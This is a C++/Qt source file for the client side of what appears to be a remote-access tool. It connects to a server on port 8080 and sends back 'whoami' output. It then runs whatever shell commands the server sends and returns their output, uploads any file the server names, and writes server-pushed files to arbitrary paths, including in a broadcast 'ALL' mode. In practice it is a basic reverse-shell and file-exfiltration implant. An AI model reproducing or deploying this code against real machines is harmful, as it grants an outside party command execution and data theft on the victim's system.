#include "client.h"

#define PORT 8080
#define BUFFER_SIZE 1024
//-------------------------------------------------------------------------------------------
Client::Client(QObject *parent) : QObject{parent}
{
    socket = new QTcpSocket();
    connect(socket, &QTcpSocket::readyRead, this, &Client::readSocket);
    connect(socket, &QTcpSocket::errorOccurred, this, &Client::displayError);
    connect(socket, &QTcpSocket::disconnected, this, &Client::discardSocket);
    socket->connectToHost(QHostAddress::LocalHost, PORT); // LocalHost
    // socket->connectToHost(QHostAddress::AnyIPv4, PORT);   // IPv4

    if (socket->waitForConnected(-1))
    {
        qDebug() << "Connected";
        sendByte("whoami", command("whoami"));
        return;
    }
    else
    {
        qDebug() << QString("The following error occurred: %1.").arg(socket->errorString());
    }
}
Client::~Client()
{
    delete socket;
}
//-------------------------------------------------------------------------------------------
QByteArray Client::command(QString com)
{
    QProcess process(this);
    QDir dir;
    QByteArray output, error;
    if (com.contains("cd "))
    {
        QString path = com.split("cd ")[1];
        dir.setCurrent(path);
    }
    else
    {
        process.startCommand(com);
        process.waitForFinished(-1);
        error = process.readAllStandardError();
        output = process.readAllStandardOutput();
    }
    if (error.isEmpty())
        return output;
    else
        return error;
}
//-------------------------------------------------------------------------------------------
void Client::readSocket()
{
    QByteArray buffer;
    QDataStream socketStream(socket);
    socketStream.setVersion(QDataStream::Qt_6_5);
    socketStream.startTransaction();
    socketStream >> buffer;
    if (!socketStream.commitTransaction())
    {
        return;
    }
    QString header = buffer.mid(0, 128);
    QString Type = header.split(",")[0].split(":")[1];
    buffer = buffer.mid(128);
    if (Type == "signal")
    {
        QString signal(buffer.toStdString().c_str());
        if (signal.contains("ALL;"))
        {
            signal = signal.split(";")[1];
            if (signal.contains("DOWNLOAD"))
            {
                // sendFile("ALL;DOWNLOAD" + signal.split(" ")[2], signal.split(" ")[1]);
                sendFile("ALL;DOWNLOAD", signal.split(" ")[1]);
            }
            else
            {
                sendByte("ALL;command", "done");
                qDebug() << command(signal).toStdString();
            }
        }
        else
        {
            if (signal.contains("DOWNLOAD "))
            {
                // sendFile(signal.split(" ")[2], signal.split(" ")[1]);//should follow DOWNLOAD <filepath>/filename.txt <destonation path>

                sendFile("DOWNLOAD", signal.split(" ")[1]); // should follow DOWNLOAD <filepath>/filename.txt
            }
            else
                sendByte("command", command(signal));
        }
    }
    else if (Type == "file")
    {
        QString fileName = header.split(",")[1].split(":")[1];
        QString signal = header.split(",")[2].split(":")[1];
        QString size = header.split(",")[3].split(":")[1].split(";")[0];
        if (signal.contains("ALL;"))
        {
            signal = signal.split(";")[1];
            QString filePath = signal + fileName;
            QFile file(filePath);
            if (file.open(QIODevice::WriteOnly | QIODevice::Truncate))
            {
                file.write(buffer);
                file.close();
                sendByte("ALL;Upload", (fileName + " Uploaded.").toLocal8Bit()); // should change for send all
            }
        }
        else
        {
            QString filePath = signal + fileName;
            QFile file(filePath);
            if (file.open(QIODevice::WriteOnly | QIODevice::Truncate))
            {
                file.write(buffer);
                file.close();
                sendByte("Upload", (fileName + " Uploaded.").toLocal8Bit());
            }
        }
    }
}
void Client::displayError(QAbstractSocket::SocketError socketError)
{
    switch (socketError)
    {
    case QAbstractSocket::RemoteHostClosedError:
        break;
    case QAbstractSocket::HostNotFoundError:
        qDebug() << "The host was not found. Please check the host name and port settings.";
        break;
    case QAbstractSocket::ConnectionRefusedError:
        qDebug() << "The connection was refused by the peer. Make sure QTCPServer is running, and check that the host name and port settings are correct.";
        break;
    default:
        qDebug() << QString("The following error occurred: %1.").arg(socket->errorString());
        break;
    }
}
void Client::discardSocket()
{
    socket->deleteLater();
    socket = nullptr;
    qDebug() << "Disconnected";
}
//-------------------------------------------------------------------------------------------
void Client::sendByte(QString signal, QByteArray byte)
{
    if (socket)
    {
        if (socket->isOpen())
        {
            QDataStream socketStream(socket);
            socketStream.setVersion(QDataStream::Qt_6_5);
            QByteArray header;
            header.prepend(QString("Type:byte,signal:%1,fileSize:%2;").arg(signal, signal.size()).toUtf8());
            header.resize(128);
            QByteArray byteArray = byte;
            byteArray.prepend(header);
            socketStream.setVersion(QDataStream::Qt_6_5);
            socketStream << byteArray;
        }
        else
            qDebug() << "Socket doesn't seem to be opened";
    }
    else
        qDebug() << "Not connected";
}
void Client::sendFile(QString signal, QString filePath)
{
    if (socket)
    {
        if (socket->isOpen())
        {
            if (filePath.isEmpty())
            {
                qDebug() << "You haven't selected any attachment!";
            }
            else
            {
                QDataStream socketStream(socket);
                socketStream.setVersion(QDataStream::Qt_6_5);
                //-------------------------------------------------------------------------------------------
                QFile m_file(filePath);
                if (m_file.open(QIODevice::ReadOnly))
                {
                    QFileInfo fileInfo(m_file.fileName());
                    QString fileName(fileInfo.fileName());
                    QByteArray header;
                    header.prepend(QString("Type:file,Name:%1,signal:%2,Size:%3;").arg(fileName).arg(signal).arg(m_file.size()).toUtf8());
                    header.resize(128);
                    //-------------------------------------------------------------------------------------------
                    QByteArray byteArray = m_file.readAll();
                    byteArray.prepend(header);
                    //-------------------------------------------------------------------------------------------
                    socketStream << byteArray;
                }
                else
                    qDebug() << "Attachment is not readable!";
            }
        }
        else
            qDebug() << "Socket doesn't seem to be opened";
    }
    else
        qDebug() << "QTCPClient", "Not connected";
}
